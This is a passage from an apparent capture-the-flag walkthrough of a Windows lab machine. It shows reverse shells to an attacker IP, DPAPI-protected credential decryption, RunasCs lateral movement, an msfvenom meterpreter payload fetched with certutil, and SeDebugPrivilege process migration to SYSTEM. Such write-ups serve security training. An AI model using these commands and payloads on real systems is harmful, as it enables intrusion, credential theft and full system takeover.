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'
```

```bash
$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.89.71] 49672
```

```powershell
PS C:\Users\sfitz\Documents> ls


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        


PS C:\Users\sfitz\Documents> cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

We have hash of `alaading` `01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6` 

This looks like DPAP hash blob so decode it to get clear pass:

```powershell
PS C:\Users\sfitz\Documents> $EncryptedString = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"
PS C:\Users\sfitz\Documents> $SecureString = ConvertTo-SecureString -String $EncryptedString
PS C:\Users\sfitz\Documents> $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username", $SecureString
PS C:\Users\sfitz\Documents> $Credential.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```

We get pass `f8gQ8fynP44ek1m3`
# Lateral Movement

Login as `alaading`.

```powershell
PS C:\Users\sfitz\Documents> Invoke-WebRequest -Uri "http://10.10.14.122:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
PS C:\Users\sfitz\Documents> cd c:\Windows\Temp
PS C:\Windows\Temp> ls


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/14/2025  12:07 PM                vmware-SYSTEM                                                         
-a----       10/14/2025   1:10 PM          51712 RunasCs.exe                                                           
-a----       10/14/2025  12:08 PM            102 silconfig.log                                                         
-a----        1/23/2024   2:49 AM         120643 vmware-vmsvc-SYSTEM.log                                               
-a----        1/23/2024   2:29 AM          14691 vmware-vmtoolsd-Administrator.log                                     
-a----       10/14/2025  12:07 PM          15190 vmware-vmtoolsd-SYSTEM.log                                            
-a----        1/23/2024   2:49 AM          57366 vmware-vmusr-Administrator.log                                        
-a----       10/14/2025  12:07 PM          14430 vmware-vmvss-SYSTEM.log                                               


PS C:\Windows\Temp> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 whoami

pov\alaading

PS C:\Windows\Temp> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.122:1234

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-da7d4$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4744 created in background.
```

```bash
$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.89.71] 49680
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
pov\alaading
PS C:\Windows\system32> cd c:\Users\alaading\Desktop
cd c:\Users\alaading\Desktop
PS C:\Users\alaading\Desktop> cat user.txt
cat user.txt
6b3790e12e6fa4076883b3b14d3deb61
```
# Privilege Escalation
## SeDebugPrivilege Process Migration

```powershell
PS C:\Users\alaading\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

With `SeDebugPrivilege`, you can interact with and debug other processes, which often leads to privilege escalation.

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.122 LPORT=7777 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

```bash
$ msfconsole -q
[msf](Jobs:0 Agents:0) >>  use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set Payload windows/x64/meterpreter/reverse_tcp
Payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >>  set LPORT 7777
LPORT => 7777
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.122:7777 
```

```powershell
PS C:\Users\alaading\Desktop>  certutil.exe -urlcache -split -f "http://10.10.14.122:8000/shell.exe" ".\shell.exe"
 certutil.exe -urlcache -split -f "http://10.10.14.122:8000/shell.exe" ".\shell.exe"
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.
PS C:\Users\alaading\Desktop> .\shell.exe
.\shell.exe
```

```bash
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.122:7777 
[*] Sending stage (203846 bytes) to 10.129.89.71
[*] Meterpreter session 1 opened (10.10.14.122:7777 -> 10.129.89.71:49683) at 2025-10-14 15:17:39 -0500

(Meterpreter 1)(C:\Users\alaading\Desktop) > 
```

Finding an appropriate process to inject code on behalf of it in the meterpreter shell:

```bash
(Meterpreter 1)(C:\Users\alaading\Desktop) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User          Path
 ---   ----  ----               ----  -------  ----          ----
 0     0     [System Process]
 4     0     System             x64   0
 64    620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 88    4     Registry           x64   0
 272   4     smss.exe           x64   0
 308   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 324   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 380   372   csrss.exe          x64   0
 384   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 484   476   csrss.exe          x64   1
 508   372   wininit.exe        x64   0
 544   476   winlogon.exe       x64   1                      C:\Windows\System32\winlogon.exe
 620   508   services.exe       x64   0
 636   508   lsass.exe          x64   0                      C:\Windows\System32\lsass.exe
 748   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 772   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 796   508   fontdrvhost.exe    x64   0                      C:\Windows\System32\fontdrvhost.exe
 804   544   fontdrvhost.exe    x64   1                      C:\Windows\System32\fontdrvhost.exe
 876   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 924   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 972   544   dwm.exe            x64   1                      C:\Windows\System32\dwm.exe
 988   3532  powershell.exe     x64   0                      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 996   620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1020  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1128  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1176  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1184  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1196  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1216  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1256  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1276  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1300  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1352  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1392  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1404  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1412  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1448  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1464  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1480  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1548  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1564  2704  w3wp.exe           x64   0                      C:\Windows\System32\inetsrv\w3wp.exe
 1620  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1712  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1752  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1776  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1812  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1872  3532  conhost.exe        x64   0                      C:\Windows\System32\conhost.exe
 1892  4744  shell.exe          x64   0        POV\alaading  C:\Users\alaading\Desktop\shell.exe
 1968  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1980  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 1992  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2000  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2060  4744  conhost.exe        x64   0        POV\alaading  C:\Windows\System32\conhost.exe
 2084  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2104  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2164  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2172  620   vmtoolsd.exe       x64   0                      C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2184  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2200  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2208  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2220  620   vm3dservice.exe    x64   0                      C:\Windows\System32\vm3dservice.exe
 2244  620   VGAuthService.exe  x64   0                      C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 2312  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2360  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2704  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2796  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2848  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 2920  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 3032  2220  vm3dservice.exe    x64   1                      C:\Windows\System32\vm3dservice.exe
 3436  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 3532  1564  cmd.exe            x64   0                      C:\Windows\System32\cmd.exe
 3600  620   dllhost.exe        x64   0                      C:\Windows\System32\dllhost.exe
 3668  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 3792  620   msdtc.exe          x64   0                      C:\Windows\System32\msdtc.exe
 3828  772   WmiPrvSE.exe       x64   0                      C:\Windows\System32\wbem\WmiPrvSE.exe
 4100  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 4144  544   LogonUI.exe        x64   1                      C:\Windows\System32\LogonUI.exe
 4328  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 4468  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe
 4744  3680  powershell.exe     x64   0        POV\alaading  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 4988  620   svchost.exe        x64   0                      C:\Windows\System32\svchost.exe

(Meterpreter 1)(C:\Users\alaading\Desktop) > 
```

Migrate to the **winlogon.exe**.  Move your shell from the `alaading` user's process to `winlogon.exe` (PID 544). 

- . **winlogon.exe**: This is a critical Windows system process that runs as **NT AUTHORITY\SYSTEM**

The PID of **winlogin.exe** here is **544** the migration was done by the following command:

```bash
(Meterpreter 1)(C:\Users\alaading\Desktop) > migrate 544
[*] Migrating from 1892 to 544...
[*] Migration completed successfully.
```

```bash
(Meterpreter 1)(C:\Windows\system32) > shell
Process 2740 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
type c:\Users\Administrator\Desktop\root.txt
359f06f1f6f90e189097fa69e4f52d9a
```

---